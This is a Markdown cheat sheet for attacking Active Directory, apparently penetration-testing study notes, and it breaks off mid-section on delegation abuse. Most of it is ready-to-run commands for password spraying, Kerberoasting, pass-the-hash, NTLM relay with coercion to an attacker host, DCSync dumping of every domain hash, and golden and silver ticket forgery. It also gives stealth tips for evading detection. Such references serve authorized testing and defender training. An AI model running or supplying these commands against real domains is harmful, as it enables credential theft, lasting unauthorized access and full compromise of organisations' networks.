# Active Directory Exploitation
## üéØ Goal

Escalate from a single foothold in an AD environment to¬†**domain dominance**¬†using Kerberos/NTLM abuses, misconfigurations, and attack paths.

---
## Table of Contents

1. [AD Context & Discovery](#51-ad-context-discovery)
2. [Basic AD Enumeration](#52-basic-ad-enumeration)
3. [Password Attacks](#53-password-attacks)
4. [Kerberoasting](#54-kerberoasting)
5. [AS-REP Roasting](#55-as-rep-roasting)
6. [Pass-the-Hash (PtH)](#56-pass-the-hash-pth)
7. [Pass-the-Ticket & Overpass-the-Hash](#57-pass-the-ticket-overpass-the-hash)
8. [Lateral Movement](#58-lateral-movement)
9. [NTLM Relay Attacks](#59-ntlm-relay-attacks)
10. [DCSync](#510-dcsync)
11. [Golden & Silver Tickets](#511-golden-silver-tickets)
12. [Delegation Abuse](#512-delegation-abuse)
13. [BloodHound & Attack Path Analysis](#513-bloodhound-attack-path-analysis)
14. [ACL-Based Attacks](#514-acl-based-attacks)
15. [AD CS Abuse](#515-ad-cs-abuse)
16. [Credential Extraction](#516-credential-extraction)

---

## üìã Phase Checklist

### üè∑Ô∏è AD Context & Discovery

- [ ] Domain name, forest, and DCs identified ‚Üí¬†[5.1](#51-ad-context-discovery)
- [ ] Current user's domain groups and privileges enumerated ‚Üí¬†[5.1](#51-ad-context-discovery)
- [ ] Trust relationships between domains mapped ‚Üí¬†[5.1](#51-ad-context-discovery)
- [ ] Domain/forest functional levels determined ‚Üí¬†[5.1](#51-ad-context-discovery)

### üîç Basic AD Enumeration

- [ ] Users, groups, computers, and GPOs enumerated ‚Üí¬†[5.2](#52-basic-ad-enumeration)
- [ ] High-value groups identified (Domain Admins, Enterprise Admins, etc.) ‚Üí¬†[5.2](#52-basic-ad-enumeration)
- [ ] Service accounts and their permissions documented ‚Üí¬†[5.2](#52-basic-ad-enumeration)
- [ ] ACLs and delegation settings examined ‚Üí¬†[5.2](#52-basic-ad-enumeration)

### üîë Password Attacks

- [ ] Password policy retrieved ‚Üí¬†[5.3](#53-password-attacks)
- [ ] Password spraying attempted ‚Üí¬†[5.3](#53-password-attacks)

### üî• Kerberos Attacks

- [ ] Kerberoastable accounts (users with SPNs) identified ‚Üí¬†[5.4](#54-kerberoasting)
- [ ] AS-REP roastable accounts (no pre-auth) found ‚Üí¬†[5.5](#55-as-rep-roasting)
- [ ] TGS/AS-REP hashes collected and cracked ‚Üí¬†[5.4](#54-kerberoasting),¬†[5.5](#55-as-rep-roasting)

### üîë Credential Abuse & Lateral Movement

- [ ] Pass-the-Hash tested on SMB/WinRM/RDP ‚Üí¬†[5.6](#56-pass-the-hash-pth)
- [ ] Pass-the-Ticket / ticket injection used ‚Üí¬†[5.7](#57-pass-the-ticket-overpass-the-hash)
- [ ] Overpass-the-Hash for token elevation ‚Üí¬†[5.7](#57-pass-the-ticket-overpass-the-hash)
- [ ] Credential reuse across systems tested ‚Üí¬†[5.8](#58-lateral-movement)

### üëë High-Value Attacks

- [ ] NTLM relay when SMB signing disabled ‚Üí¬†[5.9](#59-ntlm-relay-attacks)
- [ ] DCSync attempted if rights permit ‚Üí¬†[5.10](#510-dcsync)
- [ ] Golden/Silver Tickets created ‚Üí¬†[5.11](#511-golden-silver-tickets)
- [ ] Delegation abuses (unconstrained/constrained/RBCD) exploited ‚Üí¬†[5.12](#512-delegation-abuse)

### üó∫Ô∏è Graph Analysis & Attack Pathing

- [ ] BloodHound data collected and uploaded ‚Üí¬†[5.13](#513-bloodhound-attack-path-analysis)
- [ ] Shortest path to Domain Admins identified ‚Üí¬†[5.13](#513-bloodhound-attack-path-analysis)
- [ ] Attack chains executed or documented ‚Üí¬†[5.13](#513-bloodhound-attack-path-analysis)

### üõ°Ô∏è ACL & AD CS Attacks

- [ ] ACL-based attacks for privilege escalation ‚Üí¬†[5.14](#514-acl-based-attacks)
- [ ] AD CS vulnerabilities enumerated and exploited ‚Üí¬†[5.15](#515-ad-cs-abuse)

### üîê Credential Extraction

- [ ] Credentials extracted from memory (LSASS) ‚Üí¬†[5.16](#516-credential-extraction)
- [ ] SAM/LSA/NTDS dumped ‚Üí¬†[5.16](#516-credential-extraction)

---

## üè∑Ô∏è Key Terminology

**Kerberos**¬†- Network authentication protocol using tickets¬†**NTLM**¬†- Older challenge-response authentication protocol¬†**SPN (Service Principal Name)**¬†- Unique identifier for a service instance¬†**TGT (Ticket Granting Ticket)**¬†- Initial authentication ticket from KDC¬†**TGS (Ticket Granting Service)**¬†- Service-specific ticket¬†**Delegation**¬†- Allowing a service to impersonate users to other services¬†**ACL (Access Control List)**¬†- Permissions on AD objects¬†**DCSync**¬†- Technique to simulate domain controller replication¬†**krbtgt**¬†- Key Distribution Center service account (used for Golden Tickets)¬†**AD CS**- Active Directory Certificate Services

---

## 5.1 üè∑Ô∏è AD Context & Discovery

### üéØ Goal

Identify the domain environment, domain controllers, trusts, and current user context.

### üìã Prerequisites

- Initial foothold on domain-joined machine
- Domain user credentials (or access to a domain context)

### üîß Commands

#### From Windows (PowerShell/CMD)

```powershell
# Basic domain information
systeminfo | findstr /B "Domain"
echo %USERDOMAIN%
echo %USERDNSDOMAIN%
echo %LOGONSERVER%

# Current user context
whoami /all
whoami /priv
whoami /groups
net user %USERNAME% /domain

# Domain Controllers
nltest /dclist:<DOMAIN>
nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN>

# Domain information
net group "Domain Controllers" /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain

# Trust relationships
nltest /trusted_domains
```

#### PowerView Enumeration

```powershell
# Import PowerView
powershell -ep bypass
Import-Module .\PowerView.ps1

# Domain info
Get-NetDomain
Get-NetDomain -Domain <DOMAIN>
Get-DomainSID

# Domain Controllers
Get-NetDomainController
Get-NetDomainController -Domain <DOMAIN>

# Forest information
Get-NetForest
Get-NetForestDomain
Get-NetForestCatalog

# Trust relationships
Get-NetDomainTrust
Get-NetForestTrust
```

#### AD Module Enumeration

```powershell
# Import AD Module
Import-Module ActiveDirectory

# Domain info
Get-ADDomain
Get-ADDomain -Identity <DOMAIN>

# Forest info
Get-ADForest
(Get-ADForest).Domains

# Domain Controllers
Get-ADDomainController -Filter *

# Trust relationships
Get-ADTrust -Filter *
```

#### From Linux

```bash
# Using ldapsearch
ldapsearch -x -H ldap://<DC_IP> -b "dc=domain,dc=local"

# Using rpcclient
rpcclient -U '<USERNAME>%<PASSWORD>' <DC_IP> -c "enumdomains"
rpcclient -U '<USERNAME>%<PASSWORD>' <DC_IP> -c "querydominfo"
rpcclient -U '<USERNAME>%<PASSWORD>' <DC_IP> -c "enumdomusers"

# Using enum4linux-ng
enum4linux-ng -A <DC_IP> -u '<USERNAME>' -p '<PASSWORD>'

# Using netexec/crackmapexec
netexec smb <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' --shares
netexec ldap <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' --users
```

---

## 5.2 üîç Basic AD Enumeration

### üéØ Goal

Enumerate users, groups, computers, GPOs, ACLs, and identify high-value targets.

### üìã Prerequisites

- Domain user credentials
- Network connectivity to DC

### üîß Commands

#### User Enumeration

```powershell
# PowerView
Get-NetUser
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Get-DomainUser -PreauthNotRequired | select samaccountname

# AD Module
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}

# CMD
net user /domain
net user <USERNAME> /domain
```

#### Group Enumeration

```powershell
# PowerView
Get-NetGroup
Get-NetGroup | select cn
Get-NetGroup "Domain Admins" | select member
Get-NetGroup -AdminCount | select cn

# AD Module
Get-ADGroup -Filter *
Get-ADGroupMember -Identity "Domain Admins" -Recursive

# CMD
net group /domain
net group "Domain Admins" /domain
net localgroup Administrators
```

#### Computer Enumeration

```powershell
# PowerView
Get-NetComputer
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion
Get-NetComputer -Unconstrained
Get-NetComputer -TrustedToAuth
Find-LocalAdminAccess

# AD Module
Get-ADComputer -Filter * -Properties *
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
```

#### From Linux with NetExec

```bash
# User enumeration
netexec ldap <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' --users
netexec ldap <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' --active-users

# Group enumeration
netexec ldap <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' --groups

# Admin count enumeration
netexec ldap <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' --admin-count

# Find delegation
netexec ldap <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' --trusted-for-delegation

# Useful modules
netexec ldap <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' -M get-desc-users
netexec ldap <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' -M whoami
```

#### Share Enumeration

```bash
# NetExec/CrackMapExec
netexec smb <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' --shares
crackmapexec smb <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' --shares -M spider_plus

# smbclient
smbclient -L //<DC_IP> -U '<USERNAME>%<PASSWORD>'
smbclient //<DC_IP>/<SHARE> -U '<USERNAME>%<PASSWORD>'

# smbmap
smbmap -H <DC_IP> -u '<USERNAME>' -p '<PASSWORD>'
smbmap -H <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' -r <SHARE>
```

---

## 5.3 üîë Password Attacks

### üéØ Goal

Identify valid credentials through password spraying and credential testing.

### üìã Prerequisites

- List of usernames
- Network connectivity to DC
- Knowledge of password policy (to avoid lockouts)

### üîß Commands

#### Get Password Policy

```bash
# NetExec
netexec smb <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' --pass-pol

# CrackMapExec
crackmapexec smb <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' --pass-pol

# enum4linux
enum4linux -P <DC_IP>
```

#### Password Spraying with Kerbrute

```bash
# User enumeration
./kerbrute userenum -d <DOMAIN> --dc <DC_IP> /PATH/TO/usernames.txt

# Password spray single password
./kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt '<PASSWORD>'

# With delay (avoid lockout)
./kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> users.txt '<PASSWORD>' --delay 100
```

#### Password Spraying with NetExec/CrackMapExec

```bash
# SMB spray
netexec smb <DC_IP> -u users.txt -p '<PASSWORD>' --continue-on-success
crackmapexec smb <DC_IP> -u users.txt -p '<PASSWORD>' --continue-on-success

# WinRM spray
netexec winrm <DC_IP> -u users.txt -p '<PASSWORD>' --continue-on-success

# Multiple passwords
crackmapexec smb <DC_IP> -u users.txt -p passwords.txt --continue-on-success

# Local auth spray
crackmapexec smb <IP_RANGE> -u administrator -p '<PASSWORD>' --local-auth

# Hash spray
crackmapexec smb <IP_RANGE> -u administrator -H '<NTLM_HASH>' --local-auth
```

#### Windows Password Spray

```powershell
# DomainPasswordSpray.ps1
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password 'Summer2021!'
Invoke-DomainPasswordSpray -UserList users.txt -PasswordList passwords.txt -Domain <DOMAIN>

# Rubeus brute
.\Rubeus.exe brute /users:users.txt /passwords:passwords.txt /domain:<DOMAIN>
```

---

## 5.4 üî• Kerberoasting

### üéØ Goal

Obtain crackable TGS tickets for service accounts to recover plaintext passwords.

### üìã Prerequisites

- Domain user credentials
- Service accounts with SPNs registered
- Network connectivity to DC

### üîß Commands

#### Find Kerberoastable Accounts

```powershell
# PowerView
Get-DomainUser -SPN | select samaccountname,serviceprincipalname

# AD Module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

# setspn (native)
setspn -T <DOMAIN> -Q */*
```

#### Request TGS Tickets - Linux

```bash
# Impacket GetUserSPNs
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -request
impacket-GetUserSPNs <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -request -outputfile hashes.kerberoast

# With hash
impacket-GetUserSPNs <DOMAIN>/<USERNAME> -hashes :<NTLM_HASH> -dc-ip <DC_IP> -request

# NetExec
netexec ldap <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' --kerberoasting hashes.kerberoast
```

#### Request TGS Tickets - Windows

```powershell
# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:<USERNAME> /outfile:hashes.kerberoast

# Invoke-Kerberoast
Import-Module .\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -Encoding ASCII hashes.kerberoast
```

#### Crack TGS Hashes

```bash
# Hashcat (mode 13100 for TGS-REP)
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John
john --format=krb5tgs hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 5.5 üî• AS-REP Roasting

### üéØ Goal

Obtain crackable AS-REP responses for accounts with pre-authentication disabled.

### üìã Prerequisites

- Accounts with "Do not require Kerberos pre-authentication" enabled
- Network connectivity to DC
- Valid username list (credentials not required for the attack itself)

### üîß Commands

#### Find Vulnerable Accounts

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname

# AD Module
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

#### Request AS-REP Hashes - Linux

```bash
# Impacket GetNPUsers (with creds)
impacket-GetNPUsers <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP> -request

# Without creds (enumerate from user list)
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep.hashes

# For specific user (no creds needed)
impacket-GetNPUsers <DOMAIN>/<TARGET_USER> -no-pass -dc-ip <DC_IP>
```

#### Request AS-REP Hashes - Windows

```powershell
# Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes
.\Rubeus.exe asreproast /user:<USERNAME> /format:hashcat
```

#### Crack AS-REP Hashes

```bash
# Hashcat (mode 18200 for AS-REP)
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John
john --format=krb5asrep asrep.hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 5.6 üîë Pass-the-Hash (PtH)

### üéØ Goal

Authenticate using NTLM hashes instead of plaintext passwords.

### üìã Prerequisites

- NTLM hash of target user
- SMB/WinRM access to target
- Local admin rights on target (for most techniques)

### üîß Commands

#### Linux Tools

```bash
# Impacket psexec (gets SYSTEM shell)
impacket-psexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH>

# Impacket wmiexec
impacket-wmiexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH>

# Impacket smbexec
impacket-smbexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH>

# Evil-WinRM (requires WinRM enabled - port 5985)
evil-winrm -i <TARGET_IP> -u <USERNAME> -H <NTLM_HASH>

# NetExec/CrackMapExec
netexec smb <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -x "whoami"
netexec winrm <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -x "whoami"
crackmapexec smb <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> --sam
crackmapexec smb <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> --lsa

# xfreerdp (RDP PtH - requires Restricted Admin mode)
xfreerdp /u:<USERNAME> /pth:<NTLM_HASH> /d:<DOMAIN> /v:<TARGET_IP>
```

#### Windows Tools

```powershell
# Mimikatz sekurlsa::pth
mimikatz # sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:cmd.exe

# Invoke-TheHash
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target <TARGET_IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLM_HASH> -Command "whoami"
Invoke-WMIExec -Target <TARGET_IP> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLM_HASH> -Command "whoami"
```

---

## 5.7 üé´ Pass-the-Ticket & Overpass-the-Hash

### üéØ Goal

Use Kerberos tickets for authentication instead of passwords/hashes.

### üìã Prerequisites

- Valid Kerberos ticket (.kirbi or .ccache) OR NTLM hash
- Network connectivity to target

### üîß Commands

#### Overpass-the-Hash (Request TGT with hash)

```powershell
# Rubeus - request TGT and inject
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /rc4:<NTLM_HASH> /ptt

# Rubeus - with AES key (more stealthy)
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES_KEY> /ptt

# Mimikatz
mimikatz # sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:powershell.exe
```

```bash
# Linux - Impacket getTGT
impacket-getTGT <DOMAIN>/<USERNAME> -hashes :<NTLM_HASH> -dc-ip <DC_IP>
export KRB5CCNAME=<USERNAME>.ccache

# Use with other tools
impacket-psexec <DOMAIN>/<USERNAME>@<TARGET> -k -no-pass
impacket-wmiexec <DOMAIN>/<USERNAME>@<TARGET> -k -no-pass
```

#### Pass-the-Ticket

```powershell
# Export tickets from memory (requires admin)
mimikatz # sekurlsa::tickets /export

# Rubeus dump
.\Rubeus.exe dump

# Inject ticket
mimikatz # kerberos::ptt <TICKET>.kirbi
.\Rubeus.exe ptt /ticket:<TICKET>.kirbi

# Verify
klist
```

```bash
# Linux - convert ticket format
impacket-ticketConverter ticket.kirbi ticket.ccache
impacket-ticketConverter ticket.ccache ticket.kirbi

# Use ticket
export KRB5CCNAME=ticket.ccache
impacket-psexec <DOMAIN>/<USERNAME>@<TARGET> -k -no-pass
```

---

## 5.8 üñ•Ô∏è Lateral Movement

### üéØ Goal

Move laterally across the domain using various remote execution methods.

### üìã Prerequisites

- Valid credentials (password or hash)
- Appropriate access rights on targets
- Network connectivity

### üîß Commands

#### PsExec (SMB - Port 445)

```bash
# Impacket
impacket-psexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
impacket-psexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH>

# Sysinternals (Windows)
.\PsExec.exe \\<TARGET> -u <DOMAIN>\<USERNAME> -p <PASSWORD> cmd.exe
```

#### WMIExec (WMI - Port 135)

```bash
impacket-wmiexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
impacket-wmiexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH>
```

#### SMBExec (SMB - Port 445)

```bash
impacket-smbexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
impacket-smbexec <DOMAIN>/<USERNAME>@<TARGET_IP> -hashes :<NTLM_HASH>
```

#### ATExec (Task Scheduler - Port 445)

```bash
impacket-atexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> "command"
```

#### DCOMExec (DCOM - Port 135)

```bash
impacket-dcomexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>
```

#### Evil-WinRM (WinRM - Port 5985/5986)

```bash
evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD>
evil-winrm -i <TARGET_IP> -u <USERNAME> -H <NTLM_HASH>

# With SSL (port 5986)
evil-winrm -i <TARGET_IP> -u <USERNAME> -p <PASSWORD> -S
```

#### NetExec Command Execution

```bash
# SMB
netexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -x "whoami"
netexec smb <TARGET_IP> -u <USERNAME> -H <NTLM_HASH> -x "whoami"

# WinRM
netexec winrm <TARGET_IP> -u <USERNAME> -p <PASSWORD> -x "whoami"

# PowerShell command
netexec smb <TARGET_IP> -u <USERNAME> -p <PASSWORD> -X "Get-Process"
```

#### PowerShell Remoting

```powershell
# Enable PSRemoting
Enable-PSRemoting -Force

# Enter session
Enter-PSSession -ComputerName <TARGET> -Credential <DOMAIN>\<USERNAME>

# Invoke command
Invoke-Command -ComputerName <TARGET> -Credential <DOMAIN>\<USERNAME> -ScriptBlock {whoami}
```

---

## 5.9 üîÑ NTLM Relay Attacks

### üéØ Goal

Capture and relay NTLM authentication to compromise other systems.

### üìã Prerequisites

- Network position for MITM
- SMB signing disabled on targets (for SMB relay)
- LDAP signing not enforced (for LDAP relay)

### üîß Commands

#### Check SMB Signing

```bash
# Generate list of relay targets (signing disabled)
netexec smb <IP_RANGE> --gen-relay-list targets.txt
crackmapexec smb <IP_RANGE> --gen-relay-list targets.txt

# Check specific host
netexec smb <TARGET_IP>
# Look for "signing:False"
```

#### LLMNR/NBT-NS Poisoning

```bash
# Responder (capture hashes)
sudo responder -I eth0 -wrf
sudo responder -I eth0 -dwP

# Inveigh (Windows)
Import-Module .\Inveigh.ps1
Invoke-Inveigh -LLMNR Y -NBNS Y -mDNS Y -ConsoleOutput Y
```

#### NTLM Relay to SMB

```bash
# Setup relay (disable SMB/HTTP in Responder first)
impacket-ntlmrelayx -tf targets.txt -smb2support

# Relay with command execution
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"

# Relay with SOCKS proxy
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# Relay and dump SAM
impacket-ntlmrelayx -tf targets.txt -smb2support --sam

# Relay to LDAP (add computer account)
impacket-ntlmrelayx -t ldap://<DC_IP> --delegate-access
```

#### Coerce Authentication

```bash
# PetitPotam (MS-EFSRPC)
python3 PetitPotam.py <ATTACKER_IP> <TARGET_IP>
python3 PetitPotam.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> <ATTACKER_IP> <TARGET_IP>

# PrinterBug/SpoolSample (MS-RPRN)
python3 printerbug.py <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP> <ATTACKER_IP>

# Coercer (multiple methods)
python3 Coercer.py -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -l <ATTACKER_IP> -t <TARGET_IP>

# DFSCoerce
python3 dfscoerce.py -u <USERNAME> -p <PASSWORD> -d <DOMAIN> <ATTACKER_IP> <TARGET_IP>
```

---

## 5.10 üëë DCSync

### üéØ Goal

Extract password hashes for all domain users by simulating DC replication.

### üìã Prerequisites

- Account with DCSync rights:
    - Domain Admins, Enterprise Admins, Administrators
    - Or explicit: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All

### üîß Commands

#### Check DCSync Rights

```powershell
# PowerView
Get-ObjectAcl -DistinguishedName "dc=<DOMAIN>,dc=local" -ResolveGUIDs | Where-Object {
    ($_.ObjectType -match 'replication-get') -or 
    ($_.ActiveDirectoryRights -match 'GenericAll')
} | select IdentityReference
```

#### Perform DCSync - Windows

```powershell
# Mimikatz - single user
mimikatz # lsadump::dcsync /user:<DOMAIN>\krbtgt
mimikatz # lsadump::dcsync /user:<DOMAIN>\Administrator

# Mimikatz - all users
mimikatz # lsadump::dcsync /domain:<DOMAIN> /all /csv
```

#### Perform DCSync - Linux

```bash
# Impacket secretsdump - all hashes
impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>
impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP> -just-dc

# NTDS only (no SAM/LSA)
impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP> -just-dc-ntlm

# Single user
impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP> -just-dc-user krbtgt
impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP> -just-dc-user Administrator

# With hash
impacket-secretsdump <DOMAIN>/<USERNAME>@<DC_IP> -hashes :<NTLM_HASH> -just-dc

# With Kerberos ticket
export KRB5CCNAME=admin.ccache
impacket-secretsdump -k -no-pass <DOMAIN>/<USERNAME>@<DC_FQDN>

# NetExec
netexec smb <DC_IP> -u <USERNAME> -p <PASSWORD> --ntds
netexec smb <DC_IP> -u <USERNAME> -H <NTLM_HASH> --ntds
```

#### Crack NTLM Hashes

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## 5.11 üé´ Golden & Silver Tickets

### üéØ Goal

Create forged Kerberos tickets for persistent domain access.

### üìã Prerequisites

**Golden Ticket:**

- krbtgt NTLM hash (obtained via DCSync)
- Domain SID
- Domain name

**Silver Ticket:**

- Service account NTLM hash
- Domain SID
- Target SPN

### üîß Commands

#### Get Required Information

```powershell
# Get Domain SID
whoami /user
# SID format: S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX (remove the RID at the end)

# PowerView
Get-DomainSID

# Get krbtgt hash (requires DCSync rights)
mimikatz # lsadump::dcsync /user:<DOMAIN>\krbtgt
```

```bash
# Linux - get SID
impacket-lookupsid <DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>

# Get krbtgt hash
impacket-secretsdump <DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP> -just-dc-user krbtgt
```

#### Golden Ticket - Windows

```powershell
# Mimikatz - create and inject
mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX /krbtgt:<KRBTGT_NTLM_HASH> /ptt

# With AES key (more stealthy - avoids RC4 detection)
mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-... /aes256:<AES256_KEY> /ptt

# Create ticket file without injection
mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-... /krbtgt:<HASH> /ticket:golden.kirbi

# Rubeus
.\Rubeus.exe golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-... /krbtgt:<KRBTGT_HASH> /ptt
```

#### Golden Ticket - Linux

```bash
# Impacket ticketer
impacket-ticketer -nthash <KRBTGT_NTLM_HASH> -domain-sid S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX -domain <DOMAIN> Administrator

# With AES key
impacket-ticketer -aesKey <AES256_KEY> -domain-sid S-1-5-21-... -domain <DOMAIN> Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec <DOMAIN>/Administrator@<DC_FQDN> -k -no-pass
impacket-wmiexec <DOMAIN>/Administrator@<DC_FQDN> -k -no-pass
impacket-secretsdump <DOMAIN>/Administrator@<DC_FQDN> -k -no-pass
```

#### Silver Ticket - Windows

```powershell
# Mimikatz - for CIFS service (file shares)
mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-... /target:<TARGET_FQDN> /service:cifs /rc4:<SERVICE_ACCOUNT_HASH> /ptt

# For HTTP service (web apps)
mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-... /target:<TARGET_FQDN> /service:http /rc4:<SERVICE_ACCOUNT_HASH> /ptt

# For HOST service (PsExec, scheduled tasks)
mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-... /target:<TARGET_FQDN> /service:host /rc4:<SERVICE_ACCOUNT_HASH> /ptt

# For LDAP service (DCSync without DA)
mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:S-1-5-21-... /target:<DC_FQDN> /service:ldap /rc4:<DC_MACHINE_HASH> /ptt
```

#### Silver Ticket - Linux

```bash
# Impacket ticketer for CIFS
impacket-ticketer -nthash <SERVICE_ACCOUNT_HASH> -domain-sid S-1-5-21-... -domain <DOMAIN> -spn cifs/<TARGET_FQDN> Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-smbclient <DOMAIN>/Administrator@<TARGET_FQDN> -k -no-pass
```

#### Common Service SPNs for Silver Tickets

```
cifs      - File shares (SMB)
http      - Web applications
host      - PsExec, WMI, scheduled tasks
ldap      - LDAP operations, DCSync
mssql     - SQL Server
wsman     - WinRM/PowerShell remoting
termsrv   - RDP
```

---

## 5.12 üîÑ Delegation Abuse

### üéØ Goal

Abuse Kerberos delegation configurations to impersonate users across services.

### üìã Prerequisites

- **Unconstrained Delegation**: Compromise a server with unconstrained delegation enabled
- **Constrained Delegation**: Compromise a service account with constrained delegation rights
- **RBCD**: Write privileges on target computer object (GenericAll, GenericWrite, WriteDacl, WriteOwner)

### üîß Commands

#### Find Delegation - Windows

```powershell
# PowerView - Unconstrained Delegation (computers)
Get-DomainComputer -Unconstrained | select dnshostname,useraccountcontrol

# PowerView - Unconstrained Delegation (users - rare)
Get-DomainUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=524288)"

# PowerView - Constrained Delegation
Get-DomainUser -TrustedToAuth | select samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select dnshostname,msds-allowedtodelegateto

# AD Module
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo
Get-ADComputer -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo
```

#### Find Delegation - Linux

```bash
# NetExec
netexec ldap <DC_IP> -u '<USERNAME>' -p '<PASSWORD>' --trusted-for-delegation

# Impacket findDelegation
impacket-findDelegation <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC_IP>

# ldapsearch
